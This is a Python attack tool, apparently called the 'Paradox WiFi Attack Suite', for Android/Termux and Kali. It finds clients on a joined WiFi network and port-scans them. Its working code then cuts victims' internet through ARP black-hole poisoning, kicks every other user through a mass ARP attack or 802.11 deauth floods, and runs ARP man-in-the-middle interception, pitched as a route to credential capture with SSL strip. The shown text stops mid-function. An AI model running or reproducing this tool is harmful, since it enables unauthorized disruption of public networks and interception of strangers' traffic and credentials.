#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# paradox_wifi.py | Python 3.11+ | Termux / Android / Kali
# Paradox Tech — WiFi Attack Suite v1.0
# Plug into an open/public WiFi → see every client → attack any of them or the AP itself
# Mass deauth: kick EVERYBODY except you in one command
#
# Termux setup (run once):
#   pkg update && pkg install python python-pip tcpdump net-tools iproute2
#   pip install rich scapy requests
#   # For monitor-mode deauth (needs external USB WiFi adapter via OTG):
#   pkg install aircrack-ng
#   # Root required for raw sockets (Termux with rooted Android, or Linux)

from __future__ import annotations

import os, sys, socket, struct, subprocess, threading, time
import random, re, json, signal
from dataclasses import dataclass, field
from typing import Optional
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
except ImportError:
    print("[!] pip install rich"); sys.exit(1)

console = Console()

BANNER = r"""
[bold red]
  ██╗    ██╗██╗███████╗██╗      ██████╗  █████╗ ██████╗ 
  ██║    ██║██║██╔════╝██║     ██╔═══██╗██╔══██╗██╔══██╗
  ██║ █╗ ██║██║█████╗  ██║     ██║   ██║███████║██║  ██║
  ██║███╗██║██║██╔══╝  ██║     ██║   ██║██╔══██║██║  ██║
  ╚███╔███╔╝██║██║     ██║     ╚██████╔╝██║  ██║██████╔╝
   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═════╝ [/bold red]
[bold yellow]  PARADOX WIFI ATTACK SUITE  |  Termux Edition  |  v1.0[/bold yellow]
[dim]  Connect to any WiFi → discover clients → own the network[/dim]
"""

# ─── WiFi Client Data ─────────────────────────────────────────────────────────

@dataclass
class WifiClient:
    ip:       str
    mac:      str
    hostname: str = "unknown"
    vendor:   str = "unknown"
    os_guess: str = "unknown"
    open_ports: dict = field(default_factory=dict)
    alive:    bool  = True

@dataclass
class WifiNetwork:
    ssid:        str = "unknown"
    bssid:       str = "unknown"        # AP MAC
    channel:     int = 0
    signal_dbm:  int = 0
    frequency:   str = ""
    encryption:  str = ""
    gateway_ip:  str = ""
    gateway_mac: str = ""
    our_ip:      str = ""
    our_mac:     str = ""
    subnet_cidr: str = ""
    iface:       str = ""

# ─── OUI vendor (compact) ─────────────────────────────────────────────────────

OUI = {
    "00:50:56": "VMware",    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
    "94:65:2d": "Apple",     "f0:b4:29": "Apple",        "3c:22:fb": "Apple",
    "28:d2:44": "Samsung",   "8c:77:12": "Samsung",      "00:16:3e": "AWS/Xen",
    "52:54:00": "QEMU/KVM",  "1c:98:ec": "HP",           "00:1a:a0": "Dell",
    "68:7f:74": "TP-Link",   "cc:2d:e0": "TP-Link",      "14:91:82": "Ubiquiti",
    "24:a4:3c": "Ubiquiti",  "00:09:0f": "Fortinet",     "2c:c8:1b": "MikroTik",
    "d4:ca:6d": "MikroTik",  "d8:49:2f": "Xiaomi",       "a4:c3:f0": "Google",
    "04:d4:c4": "ASUSTek",   "fc:aa:14": "ASUSTek",      "18:60:24": "Huawei",
    "08:00:27": "VirtualBox","00:50:f2": "Microsoft",     "70:3a:51": "Intel",
}

def _vendor(mac: str) -> str:
    return OUI.get(mac[:8].lower().replace("-", ":"), "Unknown")

# ─── Network Interface Info ───────────────────────────────────────────────────

def get_wifi_iface() -> str:
    """Find the wireless interface (wlan0, wlan1, etc.)."""
    # Try common wireless iface names
    for name in ["wlan0", "wlan1", "wlp2s0", "wlp3s0", "wifi0"]:
        if Path(f"/sys/class/net/{name}").exists():
            return name
    # Fallback: list all and pick non-lo/eth
    try:
        links = os.listdir("/sys/class/net")
        for l in links:
            if l.startswith("wl"): return l
    except Exception: pass
    return "wlan0"

def get_network_info(iface: str) -> WifiNetwork:
    """
    Pull full network context: SSID, BSSID, channel, signal,
    our IP/MAC, gateway IP/MAC, subnet CIDR.
    Works on Termux (Android rooted) and Linux/Kali.
    """
    net = WifiNetwork(iface=iface)

    # ── Our IP + CIDR ──────────────────────────────────────────────────────
    try:
        out = subprocess.check_output(["ip", "addr", "show", iface], text=True)
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
        if m:
            net.our_ip    = m.group(1)
            prefix        = int(m.group(2))
            # Build CIDR
            ip_int  = struct.unpack(">I", socket.inet_aton(net.our_ip))[0]
            mask    = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
            net_int = ip_int & mask
            net.subnet_cidr = f"{socket.inet_ntoa(struct.pack('>I', net_int))}/{prefix}"
    except Exception: pass

    # ── Our MAC ───────────────────────────────────────────────────────────
    try:
        mac_path = f"/sys/class/net/{iface}/address"
        net.our_mac = Path(mac_path).read_text().strip()
    except Exception:
        try:
            out = subprocess.check_output(["ip", "link", "show", iface], text=True)
            m = re.search(r"link/ether\s+([0-9a-f:]+)", out)
            if m: net.our_mac = m.group(1)
        except Exception: pass

    # ── Gateway IP ────────────────────────────────────────────────────────
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        for line in out.splitlines():
            if "default" in line:
                parts = line.split()
                if "via" in parts:
                    net.gateway_ip = parts[parts.index("via") + 1]
                    break
    except Exception: pass

    # ── Gateway MAC (ARP) ─────────────────────────────────────────────────
    if net.gateway_ip:
        try:
            # Ping to populate ARP cache
            subprocess.run(["ping", "-c", "1", "-W", "1", net.gateway_ip],
                            capture_output=True)
            out = subprocess.check_output(["arp", "-n", net.gateway_ip], text=True)
            m = re.search(r"([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})", out)
            if m: net.gateway_mac = m.group(1)
        except Exception: pass

    # ── WiFi details (SSID, BSSID, channel, signal) ───────────────────────
    # Method 1: iw
    try:
        out = subprocess.check_output(["iw", "dev", iface, "info"], text=True,
                                       stderr=subprocess.DEVNULL)
        m = re.search(r"ssid (.+)", out)
        if m: net.ssid = m.group(1).strip()
        m = re.search(r"channel (\d+)", out)
        if m: net.channel = int(m.group(1))
        m = re.search(r"addr ([0-9a-f:]+)", out)
        if m: net.bssid = m.group(1)   # This is our iface MAC, not AP
    except Exception: pass

    # Method 2: iw station / link (gets BSSID of connected AP)
    try:
        out = subprocess.check_output(["iw", "dev", iface, "link"], text=True,
                                       stderr=subprocess.DEVNULL)
        m = re.search(r"Connected to ([0-9a-f:]+)", out, re.IGNORECASE)
        if m: net.bssid = m.group(1)
        m = re.search(r"SSID: (.+)", out)
        if m: net.ssid = m.group(1).strip()
        m = re.search(r"signal: (-\d+)", out)
        if m: net.signal_dbm = int(m.group(1))
        m = re.search(r"freq: (\d+)", out)
        if m:
            freq = int(m.group(1))
            net.frequency = f"{freq} MHz"
            # channel from freq
            if 2412 <= freq <= 2484:
                net.channel = (freq - 2412) // 5 + 1
            elif freq >= 5180:
                net.channel = (freq - 5000) // 5
    except Exception: pass

    # Method 3: iwconfig fallback
    try:
        out = subprocess.check_output(["iwconfig", iface], text=True,
                                       stderr=subprocess.DEVNULL)
        m = re.search(r'ESSID:"([^"]+)"', out)
        if m and net.ssid == "unknown": net.ssid = m.group(1)
        m = re.search(r"Access Point: ([0-9A-Fa-f:]+)", out)
        if m and net.bssid == "unknown": net.bssid = m.group(1).lower()
        m = re.search(r"Signal level=(-\d+)", out)
        if m: net.signal_dbm = int(m.group(1))
    except Exception: pass

    # Method 4: Android Termux — /proc/net/wireless or wpa_cli
    try:
        out = subprocess.check_output(["wpa_cli", "-i", iface, "status"], text=True,
                                       stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            if "=" in line:
                k, _, v = line.partition("=")
                k = k.strip().lower(); v = v.strip()
                if k == "ssid" and net.ssid == "unknown":          net.ssid = v
                elif k == "bssid" and net.bssid == "unknown":      net.bssid = v
                elif k == "freq" and not net.frequency:            net.frequency = f"{v} MHz"
                elif k == "key_mgmt" and not net.encryption:       net.encryption = v
    except Exception: pass

    return net

def print_network_info(net: WifiNetwork) -> None:
    t = Table(title="[bold red]Active WiFi Network[/bold red]",
              box=box.SIMPLE_HEAD, style="bold")
    t.add_column("Field",  style="bold cyan", width=16)
    t.add_column("Value",  style="green")
    rows = [
        ("SSID",        net.ssid),
        ("BSSID (AP)",  net.bssid),
        ("Channel",     str(net.channel)),
        ("Frequency",   net.frequency),
        ("Signal",      f"{net.signal_dbm} dBm" if net.signal_dbm else "?"),
        ("Encryption",  net.encryption or "unknown"),
        ("Our IP",      net.our_ip),
        ("Our MAC",     net.our_mac),
        ("Gateway IP",  net.gateway_ip),
        ("Gateway MAC", net.gateway_mac),
        ("Subnet",      net.subnet_cidr),
        ("Interface",   net.iface),
    ]
    for f, v in rows: t.add_row(f, v)
    console.print(t)

# ─── Client Discovery ─────────────────────────────────────────────────────────

def discover_clients(net: WifiNetwork, timeout: float = 2.0) -> list[WifiClient]:
    """
    ARP sweep the subnet → find every device on the WiFi.
    Works without monitor mode — just being connected is enough.
    Passive mDNS + ARP cache read supplements the active sweep.
    Returns list of WifiClient objects (excludes our own IP, includes gateway).
    """
    console.print(f"\n[bold yellow][*] Sweeping {net.subnet_cidr} for clients...[/bold yellow]")
    clients: dict[str, WifiClient] = {}

    # ── 1. Active ARP sweep via Scapy ────────────────────────────────────
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net.subnet_cidr),
                     timeout=timeout, verbose=False, iface=net.iface)
        for _, rcv in ans:
            ip  = rcv.psrc
            mac = rcv.hwsrc.lower()
            if ip == net.our_ip: continue
            hostname = "unknown"
            try: hostname = socket.gethostbyaddr(ip)[0]
            except Exception: pass
            ttl = _ping_ttl(ip)
            clients[ip] = WifiClient(
                ip=ip, mac=mac, vendor=_vendor(mac),
                hostname=hostname, os_guess=_ttl_os(ttl)
            )
    except ImportError:
        console.print("[red]pip install scapy[/red]")
    except Exception as e:
        console.print(f"[dim]   ARP sweep: {e}[/dim]")

    # ── 2. Read kernel ARP cache (catches devices ARP sweep missed) ───────
    try:
        arp_cache = Path("/proc/net/arp").read_text()
        for line in arp_cache.splitlines()[1:]:
            parts = line.split()
            if len(parts) < 4: continue
            ip  = parts[0]
            mac = parts[3].lower()
            flags = parts[2]
            if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"): continue
            if ip == net.our_ip: continue
            if flags == "0x0": continue   # incomplete entry
            if ip not in clients:
                hostname = "unknown"
                try: hostname = socket.gethostbyaddr(ip)[0]
                except Exception: pass
                ttl = _ping_ttl(ip)
                clients[ip] = WifiClient(
                    ip=ip, mac=mac, vendor=_vendor(mac),
                    hostname=hostname, os_guess=_ttl_os(ttl)
                )
    except Exception as e:
        console.print(f"[dim]   ARP cache: {e}[/dim]")

    # ── 3. Quick TCP ping for hosts that don't respond to ARP ─────────────
    if net.subnet_cidr:
        try:
            import ipaddress
            network = ipaddress.IPv4Network(net.subnet_cidr, strict=False)
            hosts_to_check = [str(h) for h in network.hosts()
                               if str(h) not in clients and str(h) != net.our_ip][:50]

            def _tcp_ping(ip: str):
                for port in (80, 443, 22, 23, 8080):
                    try:
                        s = socket.socket()
                        s.settimeout(0.5)
                        if s.connect_ex((ip, port)) == 0:
                            s.close()
                            if ip not in clients:
                                hostname = "unknown"
                                try: hostname = socket.gethostbyaddr(ip)[0]
                                except Exception: pass
                                clients[ip] = WifiClient(
                                    ip=ip, mac="unknown", vendor="unknown",
                                    hostname=hostname, os_guess="unknown"
                                )
                            return
                        s.close()
                    except Exception: pass

            with ThreadPoolExecutor(max_workers=30) as ex:
                ex.map(_tcp_ping, hosts_to_check)
        except Exception: pass

    result = list(clients.values())
    console.print(f"[bold green][*] {len(result)} clients found on network.[/bold green]")
    return result

def _ping_ttl(ip: str) -> int:
    try:
        out = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip],
                                       text=True, stderr=subprocess.DEVNULL)
        m = re.search(r"ttl=(\d+)", out, re.IGNORECASE)
        if m: return int(m.group(1))
    except Exception: pass
    return 0

def _ttl_os(ttl: int) -> str:
    if   60 <= ttl <= 65:   return "Linux / Android"
    elif 126 <= ttl <= 129: return "Windows"
    elif 253 <= ttl <= 256: return "Cisco / Router"
    elif ttl > 100:         return "Windows (NAT)"
    elif ttl > 60:          return "Linux (NAT)"
    elif ttl > 0:           return f"Unknown (TTL={ttl})"
    return "unknown"

def print_clients(clients: list[WifiClient], net: WifiNetwork) -> None:
    t = Table(title=f"[bold red]Clients on {net.ssid}[/bold red]",
              box=box.MINIMAL_DOUBLE_HEAD, style="bold")
    t.add_column("#",         style="bold cyan",   width=4)
    t.add_column("IP",        style="green",        width=15)
    t.add_column("MAC",       style="dim",          width=18)
    t.add_column("Vendor",    style="yellow",       width=14)
    t.add_column("Hostname",  style="dim",          width=22)
    t.add_column("OS",        style="magenta",      width=16)
    t.add_column("Ports",     style="red",          width=14)
    for i, c in enumerate(clients, 1):
        gw_tag = " [bold red][GW][/bold red]" if c.ip == net.gateway_ip else ""
        ports  = ",".join(str(p) for p in sorted(c.open_ports)[:5]) or "—"
        t.add_row(str(i), c.ip + gw_tag, c.mac,
                  c.vendor[:13], c.hostname[:21], c.os_guess[:15], ports)
    console.print(t)

def select_client(clients: list[WifiClient]) -> Optional[WifiClient]:
    if not clients:
        console.print("[red]No clients. Run discovery first.[/red]")
        return None
    print_clients(clients, WifiNetwork())
    choice = Prompt.ask("Select client # (0=cancel)", default="0")
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(clients): return clients[idx]
    except ValueError: pass
    return None

# ─── Quick Port Scan ──────────────────────────────────────────────────────────

WIFI_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445,
              3000, 3306, 3389, 5432, 5900, 6379, 7001, 8080, 8443, 27017]

def quick_scan_client(client: WifiClient) -> None:
    console.print(f"[yellow][*] Quick port scan on {client.ip}...[/yellow]")

    def _check(port: int):
        try:
            s = socket.socket()
            s.settimeout(0.8)
            if s.connect_ex((client.ip, port)) == 0:
                s.close()
                # Quick banner
                try:
                    s2 = socket.socket()
                    s2.settimeout(1.5)
                    s2.connect((client.ip, port))
                    probe = {80: b"GET / HTTP/1.0\r\n\r\n", 21: b"", 22: b""}.get(port, b"")
                    if probe: s2.sendall(probe)
                    else: time.sleep(0.2)
                    banner = s2.recv(512).decode("utf-8", errors="ignore").strip()[:60]
                    s2.close()
                except Exception:
                    banner = ""
                client.open_ports[port] = banner
                console.print(f"[green]   OPEN {port}  {banner}[/green]")
        except Exception: pass

    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(_check, WIFI_PORTS)

    if not client.open_ports:
        console.print(f"[dim]   No open ports on {client.ip}[/dim]")

# ─── ARP Black Hole (Kick Without Monitor Mode) ───────────────────────────────

def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str,
                   duration: int = 0) -> None:
    """
    ARP black hole attack — cuts victim's internet without monitor mode.
    Sends victim a poisoned ARP reply: 'gateway IP = de:ad:00:00:be:ef'
    (a MAC that doesn't exist). Victim's packets to gateway disappear.
    Victim loses internet/network access immediately.
    Runs until Ctrl-C or duration (seconds) if set.

    Requires: root, Scapy
    Does NOT require monitor mode — works while connected normally.
    Restoration: re-arp the victim with the real gateway MAC on exit.
    """
    console.print(f"[bold red][*] ARP Black Hole → {victim_ip} (cutting internet)[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp, getmacbyip
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    victim_mac  = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)
    if not victim_mac:
        console.print(f"[red][-] Can't resolve MAC for {victim_ip}[/red]"); return

    DEAD_MAC = "de:ad:00:00:be:ef"  # nonexistent MAC — packets go nowhere

    # Poison: tell victim "gateway is at DEAD_MAC"
    poison = (Ether(dst=victim_mac, src=DEAD_MAC) /
              ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                  psrc=gateway_ip, hwsrc=DEAD_MAC))

    killed   = threading.Event()
    start    = time.time()

    def _loop():
        while not killed.is_set():
            sendp(poison, iface=iface, verbose=False)
            if duration and (time.time() - start) >= duration:
                killed.set()
            time.sleep(1.0)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    console.print(f"[bold green]   {victim_ip} internet CUT. Ctrl-C to restore.[/bold green]")

    try:
        while not killed.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        killed.set()
        # Restore victim's ARP cache with real gateway MAC
        if gateway_mac:
            restore = (Ether(dst=victim_mac, src=gateway_mac) /
                       ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                           psrc=gateway_ip, hwsrc=gateway_mac))
            try:
                sendp([restore] * 5, iface=iface, verbose=False)
                console.print(f"[green][*] {victim_ip} ARP restored.[/green]")
            except Exception: pass

# ─── MASS DEAUTH / KICK ALL EXCEPT ME ────────────────────────────────────────

def mass_kick_except_me(net: WifiNetwork, clients: list[WifiClient],
                         method: str = "auto") -> None:
    """
    Kick EVERY client off the WiFi except ourselves.

    Method A — 'arp' (no monitor mode needed, works in Termux connected):
      ARP black hole every client's gateway entry simultaneously.
      All clients lose internet instantly. We're unaffected because
      we're sending, not receiving the poison.

    Method B — 'deauth' (requires monitor mode + external USB WiFi adapter):
      Send 802.11 deauth frames from spoofed AP MAC to every client + broadcast.
      This kicks clients at the WiFi association layer — cleaner, faster.
      Requires: iw dev <iface> set type monitor + ip link set up

    Method C — 'aireplay' (uses aircrack-ng aireplay-ng):
      aireplay-ng -0 0 -a BSSID <mon_iface>
      Sends continuous broadcast deauth. Locks the entire AP.

    method='auto': try deauth → fall back to arp
    """
    console.print(f"\n[bold red]╔══════════════════════════════════════════╗")
    console.print(f"║  MASS KICK — EVERYONE EXCEPT YOU         ║")
    console.print(f"║  Network: {net.ssid[:30]:<30}  ║")
    console.print(f"║  AP BSSID: {net.bssid:<29}  ║")
    console.print(f"║  Your MAC:  {net.our_mac:<28}  ║")
    console.print(f"╚══════════════════════════════════════════╝[/bold red]")

    # Filter out ourselves
    targets = [c for c in clients if c.mac.lower() != net.our_mac.lower()
                                  and c.ip != net.our_ip]

    if not targets:
        console.print("[yellow]No other clients to kick.[/yellow]")
        return

    console.print(f"[bold yellow][*] Targeting {len(targets)} clients:[/bold yellow]")
    for c in targets:
        console.print(f"   [dim]{c.ip}  {c.mac}  {c.vendor}[/dim]")

    # ── Determine method ──────────────────────────────────────────────────
    if method == "auto":
        # Check if we have a monitor-capable interface available
        mon_iface = _find_monitor_iface(net.iface)
        if mon_iface:
            method = "deauth"
            console.print(f"[green]   Monitor iface found: {mon_iface} → using deauth[/green]")
        elif _has_aireplay():
            method = "aireplay"
            console.print(f"[green]   aireplay-ng found → using aireplay[/green]")
        else:
            method = "arp"
            console.print(f"[yellow]   No monitor mode → using ARP black hole[/yellow]")

    confirm = Prompt.ask(f"[bold red]Confirm kick {len(targets)} clients via {method}? (yes/no)[/bold red]",
                          default="no")
    if confirm.lower() != "yes":
        console.print("[dim]Cancelled.[/dim]"); return

    # ── Method A: ARP Black Hole (no monitor mode) ────────────────────────
    if method == "arp":
        _mass_arp_blackhole(targets, net)

    # ── Method B: 802.11 Deauth via Scapy ────────────────────────────────
    elif method == "deauth":
        mon_iface = _find_monitor_iface(net.iface) or net.iface
        _mass_deauth_scapy(targets, net, mon_iface)

    # ── Method C: aireplay-ng broadcast deauth ────────────────────────────
    elif method == "aireplay":
        mon_iface = _find_monitor_iface(net.iface) or net.iface
        _mass_deauth_aireplay(net, mon_iface)

def _find_monitor_iface(iface: str) -> Optional[str]:
    """Check if any interface is in monitor mode, or if we can set one."""
    try:
        # Check for existing monitor interfaces
        for name in os.listdir("/sys/class/net"):
            if name.startswith("mon") or name.endswith("mon"):
                return name
        # Try detecting via iw
        out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            if "monitor" in line.lower():
                # Extract iface name from surrounding lines
                return iface  # will try on current iface
    except Exception: pass
    return None

def _has_aireplay() -> bool:
    try:
        subprocess.run(["aireplay-ng", "--help"],
                        capture_output=True, timeout=2)
        return True
    except Exception:
        return False

def _mass_arp_blackhole(targets: list[WifiClient], net: WifiNetwork) -> None:
    """
    ARP black hole all targets simultaneously in parallel threads.
    Each target gets its own poison thread.
    Everyone else loses internet. We stay connected.
    """
    console.print(f"\n[bold red][*] ARP Black Hole — cutting {len(targets)} clients simultaneously...[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp, getmacbyip
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    DEAD_MAC    = "de:ad:00:00:be:ef"
    killed      = threading.Event()
    poison_pkts: dict[str, tuple] = {}   # ip → (poison_pkt, restore_pkt)

    # Build poison packets for each target
    for c in targets:
        mac = c.mac if c.mac != "unknown" else getmacbyip(c.ip)
        if not mac or mac == "unknown": continue

        gw_mac = net.gateway_mac or getmacbyip(net.gateway_ip) or DEAD_MAC

        # Poison: victim thinks gateway = DEAD_MAC
        p_pkt = (Ether(dst=mac, src=DEAD_MAC) /
                 ARP(op=2, pdst=c.ip, hwdst=mac,
                     psrc=net.gateway_ip, hwsrc=DEAD_MAC))

        # Restore: re-tell victim the real gateway MAC
        r_pkt = (Ether(dst=mac, src=gw_mac) /
                 ARP(op=2, pdst=c.ip, hwdst=mac,
                     psrc=net.gateway_ip, hwsrc=gw_mac))

        poison_pkts[c.ip] = (p_pkt, r_pkt)

    if not poison_pkts:
        console.print("[red][-] No resolvable MACs — try running discovery again[/red]")
        return

    def _flood_poison():
        while not killed.is_set():
            pkts = [p for p, _ in poison_pkts.values()]
            try: sendp(pkts, iface=net.iface, verbose=False)
            except Exception: pass
            time.sleep(1.5)

    t = threading.Thread(target=_flood_poison, daemon=True)
    t.start()

    console.print(f"[bold green]   {len(poison_pkts)} clients CUT from internet.[/bold green]")
    console.print("[bold green]   You remain connected. Press Ctrl-C to restore all.[/bold green]")

    try:
        while True: time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        killed.set()
        # Restore all clients
        restore_pkts = [r for _, r in poison_pkts.values()] * 5
        try:
            sendp(restore_pkts, iface=net.iface, verbose=False)
            console.print(f"[green][*] ARP restored for {len(poison_pkts)} clients.[/green]")
        except Exception: pass

def _mass_deauth_scapy(targets: list[WifiClient], net: WifiNetwork, mon_iface: str) -> None:
    """
    802.11 deauth flood to each client + broadcast deauth.
    Spoofs AP BSSID as source → clients think AP kicked them.
    Skips our own MAC.

    Requires: mon_iface in monitor mode.
    Setup: iw dev wlan0 interface add mon0 type monitor && ip link set mon0 up
    """
    console.print(f"\n[bold red][*] 802.11 Deauth flood → {len(targets)} clients + broadcast[/bold red]")
    console.print(f"[dim]   Monitor iface: {mon_iface}  AP: {net.bssid}[/dim]")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    bssid  = net.bssid
    killed = threading.Event()

    # Build per-client deauth packets
    client_pkts = []
    for c in targets:
        if c.mac.lower() == net.our_mac.lower(): continue
        # AP → client deauth (from AP perspective)
        client_pkts.append(
            RadioTap() /
            Dot11(addr1=c.mac, addr2=bssid, addr3=bssid) /
            Dot11Deauth(reason=7)   # Class 3 frame from nonassociated station
        )
        # client → AP deauth (from client perspective, double deauth)
        client_pkts.append(
            RadioTap() /
            Dot11(addr1=bssid, addr2=c.mac, addr3=bssid) /
            Dot11Deauth(reason=3)   # Station is leaving BSS
        )

    # Broadcast deauth (hits all clients at once)
    broadcast_pkt = (RadioTap() /
                     Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
                     Dot11Deauth(reason=7))
    all_pkts = client_pkts + [broadcast_pkt]

    counter = [0]

    def _deauth_loop():
        while not killed.is_set():
            try:
                sendp(all_pkts, iface=mon_iface, verbose=False, inter=0.001)
                counter[0] += len(all_pkts)
            except Exception: pass
            time.sleep(0.1)

    t = threading.Thread(target=_deauth_loop, daemon=True)
    t.start()

    console.print(f"[bold green]   Deauth flood running. {len(targets)} clients disconnecting...[/bold green]")
    console.print("[bold green]   You stay connected (your MAC excluded). Ctrl-C to stop.[/bold green]")

    try:
        while True:
            time.sleep(1)
            console.print(f"[dim]   {counter[0]} deauth frames sent[/dim]", end="\r")
    except KeyboardInterrupt:
        killed.set()
        console.print(f"\n[bold green][*] Deauth stopped. {counter[0]} total frames.[/bold green]")

def _mass_deauth_aireplay(net: WifiNetwork, mon_iface: str) -> None:
    """
    Uses aireplay-ng for broadcast deauth — simplest method.
    aireplay-ng -0 0 -a BSSID <mon_iface>
    -0 0 = continuous deauth (count=0 means forever)
    Locks the entire AP — nobody can connect or stay connected.
    """
    console.print(f"\n[bold red][*] aireplay-ng broadcast deauth → AP {net.bssid}[/bold red]")
    console.print("[dim]   This locks the entire AP. Ctrl-C to stop.[/dim]")

    # Set monitor mode first if needed
    try:
        subprocess.run(["ip", "link", "set", mon_iface, "down"], capture_output=True)
        subprocess.run(["iw", "dev", mon_iface, "set", "type", "monitor"], capture_output=True)
        subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True)
        console.print(f"[green]   {mon_iface} set to monitor mode[/green]")
    except Exception: pass

    try:
        cmd = ["aireplay-ng", "-0", "0", "-a", net.bssid, mon_iface]
        console.print(f"[dim]   Running: {' '.join(cmd)}[/dim]")
        proc = subprocess.Popen(cmd)
        proc.wait()
    except FileNotFoundError:
        console.print("[red]aireplay-ng not found: pkg install aircrack-ng[/red]")
    except KeyboardInterrupt:
        try: proc.terminate()
        except Exception: pass
        console.print(f"\n[bold green][*] aireplay stopped.[/bold green]")

# ─── Monitor Mode Setup Helper ────────────────────────────────────────────────

def setup_monitor_mode(iface: str) -> Optional[str]:
    """
    Attempts to put iface into monitor mode.
    Returns monitor interface name if successful, None otherwise.
    On Android/Termux: usually requires external USB WiFi adapter via OTG cable.
    """
    console.print(f"[yellow][*] Setting up monitor mode on {iface}...[/yellow]")
    mon_iface = f"{iface}mon" if not iface.endswith("mon") else iface

    # Method 1: iw (modern)
    try:
        subprocess.run(["ip", "link", "set", iface, "down"],         check=True, capture_output=True)
        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],           check=True, capture_output=True)
        console.print(f"[bold green]   {iface} in monitor mode (iw).[/bold green]")
        return iface
    except subprocess.CalledProcessError: pass

    # Method 2: airmon-ng
    try:
        out = subprocess.check_output(["airmon-ng", "start", iface], text=True,
                                       stderr=subprocess.DEVNULL)
        m = re.search(r"monitor mode (enabled|vif enabled) (?:on|for) (\S+)", out, re.IGNORECASE)
        if m:
            mon = m.group(2).strip("[])(")
            console.print(f"[bold green]   Monitor mode: {mon} (airmon-ng)[/bold green]")
            return mon
    except FileNotFoundError:
        pass
    except Exception: pass

    # Method 3: Create virtual monitor interface
    try:
        subprocess.run(["iw", "dev", iface, "interface", "add", mon_iface,
                         "type", "monitor"], check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", mon_iface, "up"], check=True, capture_output=True)
        console.print(f"[bold green]   Virtual monitor iface created: {mon_iface}[/bold green]")
        return mon_iface
    except Exception as e:
        console.print(f"[dim]   monitor create: {e}[/dim]")

    console.print("[bold red]   Monitor mode failed. External USB WiFi adapter required for deauth.[/bold red]")
    console.print("[dim]   On Android/Termux: plug Alfa AWUS036ACH or similar via OTG → auto-detected as wlan1[/dim]")
    console.print("[dim]   ARP Black Hole method works without monitor mode.[/dim]")
    return None

# ─── ARP MITM (single client) ────────────────────────────────────────────────

def arp_mitm_client(client: WifiClient, net: WifiNetwork) -> None:
    """
    Bidirectional ARP poison between a single client and the gateway.
    Puts us in the middle — we see all their traffic.
    Pair with SSL strip for credential capture.
    """
    console.print(f"[bold red][*] ARP MITM → {client.ip} ↔ {net.gateway_ip}[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp, getmacbyip
    except ImportError:
        console.print("[red]pip install scapy[/red]"); return

    victim_mac  = client.mac if client.mac != "unknown" else getmacbyip(client.ip)
    gateway_mac = net.gateway_mac or getmacbyip(net.gateway_ip)

    if not victim_mac or not gateway_mac:
        console.print("[red][-] MAC resolution failed[/red]"); return

    # Enable forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1\n")
    except Exception: pass

    # Tell victim: gateway IP = our MAC
    pkt_to_victim = (Ether(dst=victim_mac, src=net.our_mac) /
                     ARP(op=2, pdst=client.ip, hwdst=victim_mac,
                         psrc=net.gateway_ip, hwsrc=net.our_mac))
    # Tell gateway: victim IP = our MAC
    pkt_to_gw = (Ether(dst=gateway_mac, src=net.our_mac) /
                  ARP(op=2, pdst=net.gateway_ip, hwdst=gateway_mac,
                      psrc=client.ip, hwsrc=net.our_mac))

    killed = threading.Event()

    def _loop():
        while not killed.is_set():
            try: sendp([pkt_to_victim, pkt_to_gw], iface=net.iface, verbose=False)
            except Exception: pass
            time.sleep(1.5)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    console.print(f"[bold green]   MITM active. All {client.ip} ↔ {net.gateway_ip} traffic through us.[/bold green]")
    console.print("[dim]   Run SSL strip or packet capture alongside this. Ctrl-C to stop + restore.[/dim]")

    try:
        while True: time.sleep(0.5)
    except KeyboardInterrupt:
        killed.set()
        # Restore
        try:
            r_victim = (Ether(dst=victim_mac, src=gateway_mac) /
                        ARP(op=2, pdst=client.ip, hwdst=victim_mac,
                            psrc=net.gateway_ip, hwsrc=gateway_mac))
            r_gw     = (Ether(dst=gateway_mac, src=victim_mac) /
                        ARP(op=2, pdst=net.gateway_ip, hwdst=gateway_mac,
                            psrc=client.ip, hwsrc=victim_mac))
